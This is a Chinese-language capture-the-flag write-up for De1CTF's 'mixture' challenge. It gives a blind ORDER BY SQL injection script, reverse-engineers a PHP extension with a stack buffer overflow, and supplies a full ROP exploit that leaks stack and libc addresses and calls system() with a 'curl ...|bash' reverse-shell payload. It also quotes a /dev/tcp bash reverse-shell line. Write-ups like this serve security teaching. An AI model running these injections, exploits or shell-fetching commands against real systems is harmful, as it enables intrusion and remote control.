[中文](./readme_zh.md) | [English](./readme.md)

# mixture

登陆进去之后发现member.php有\<!--orderby--\>提示，猜测存在orderby注入，简单尝试之后发现当orderby=|2，回显的页面不一样，注入脚本如下

```python
import requests

url = "http://49.51.251.99/index.php"
data = {
    "username":"xxxxx",
    "password":"xxxxxxx",
    "submit":"submit"
}
cookie ={
    "PHPSESSID": "sou26piclav6f99h79k1l5vmbn"
}
requests.post(url,data=data,cookies=cookie)
flag=''
url="http://49.51.251.99/member.php?orderby="
for i in range(1,33):
    for j in '0123456789abcdefghijklmnopqrstuvwxyz,':
        payload="|(mid((select password from member),{},1)='{}')%2b1".format(i,j)
        true_url=url+payload
        r=requests.get(true_url,cookies=cookie)
        if r.content.index('tom')<r.content.index('1000000'):
            print payload+' ok'
            flag+=j
            print flag
            break
        else:
            print payload
//18a960a3a0b3554b314ebe77fe545c85 
```

跑出来的密码经过md5解密是goodlucktoyou

search.php中调用的Minclude函数对应了Minclude.so中的zip_Minclude函数

直接反编译会发现没有什么东西，看一下汇编会看到几句简单的花指令干扰了分析。patch一下把这些花指令去除后，函数的功能十分简单：

```C
void __fastcall zif_Minclude(zend_execute_data *execute_data, zval *return_value)
{
  FILE *fp; // rbx
  unsigned int v3; // eax
  zend_value v4; // rax
  char *parameter; // [rsp+0h] [rbp-98h]
  size_t length; // [rsp+8h] [rbp-90h]
  char path[96]; // [rsp+10h] [rbp-88h]
  int v8; // [rsp+70h] [rbp-28h]
  char *v9; // [rsp+74h] [rbp-24h]

  parameter = 0LL;
  memset(path, 0, sizeof(path));
  v8 = 0;
  v9 = path;
  if ( (unsigned int)zend_parse_parameters(execute_data->This.u2.next, "s", &parameter, &length) != -1 )
  {
    memcpy(path, parameter, length);
    php_printf("%s", path);
    php_printf("<br>");
    fp = fopen(path, "rb");
    if ( fp )
    {
      while ( !feof(fp) )
      {
        v3 = fgetc(fp);
        php_printf("%c", v3);
      }
      php_printf("\n");
    }
    else
    {
      php_printf("no file\n");
    }
    v4.lval = zend_strpprintf(0LL, "True");
    return_value->value = v4;
    return_value->u1.type_info = (*(_BYTE *)(v4.lval + 5) & 2u) < 1 ? 5126 : 6;
  }
}
```

zend_parse_parameters解析传进来的参数，"s"表示解析成字符串，parameter指向解析的结果，length存放长度。

接下来memcpy将结果拷贝到栈上，拷贝的长度为length，有可能会大于path的大小，造成栈溢出。

Path的内容会先输出一下，注意到v9这个地方保存了path的地址，是为了防止本地的地址偏移和远程不一样，方便大家利用传递参数。（其实不用栈地址也可以，可以找到其他的gadget把栈的数据写到其他地方）

函数本身的功能是任意文件读，给web服务使用。这样也可以读取/proc/self/maps，拿到libc地址。

有了libc地址就能rop了，直接调用system("...")即可。

要注意，参数不要直接用栈上path中的数据，因为函数结束后平衡了栈，这里的数据已经变成无用的了，调用system时fork的时候不会保留这里的内容，所以要把参数往后放，或者ROP写到其他地方。

反弹shell的时候发现`/bin/bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0>&1`这样弹不了，换了一个脚本弹可以了。

如果想要调试的话，需要本地搭好环境后，gdb /usr/local/bin/php，然后set breakpoint pending on，就可以下断点调试了。

```python
#!/usr/bin/python3
from pwn import *
import requests
import urllib
import struct

url = "http://134.175.185.244/select.php"
url = "http://49.51.251.99/select.php"
data = {
    "username":"admin",
    "password":"goodlucktoyou",
    "submit":"submit"
}
cookie ={
    "PHPSESSID": "p51gfmno1tv687igcc1ndq14vh"
}
res = requests.post(url,data=data,cookies=cookie)
print(res.status_code)
payload = "a"*100
data = {
    'search':"a"*100,
    'submit':"submit"
}

res = requests.post(url,data=data,cookies=cookie)
print(res.content)
res = res.content.split(b'a'*100)[1]
stack = res[0:6]+b'\x00\x00'
stack = struct.unpack('<Q', stack)[0]
print("[+] stack:", hex(stack))

data = {
    'search': "/proc/self/maps", 
    'submit':"submit"
}
res = requests.post(url,data=data,cookies=cookie).content.split(b"\n")
for i in res:
    if b"libc-2.28.so" in i:
        libc_base = int(b"0x" + i[0:12], 16)
        break
print("[+] libc_base:", hex(libc_base))

bss_str = libc_base + 0x0000000001C0000
pop_rdi_ret = libc_base + 0x0000000000023a5f
read = libc_base + 0x00000000000EA450
system = libc_base + 0x00000000000449C0

payload = b"a"*136
payload += p64(pop_rdi_ret) + p64(stack+136+24) + p64(system) + b"curl https://shell.now.sh/xxx.xxx.xxx.xxx:xxxx|bash\x00"

data = {
    'search':payload, 
    'submit':"submit"
}
try:
    res = requests.post(url,data=data,cookies=cookie)
except:
    pass
```

拿到shell之后，执行/readflag，算出表达式的值即可获得flag

> De1CTF{47ae3396-f5ce-47ab-bb64-34b5154064c4}

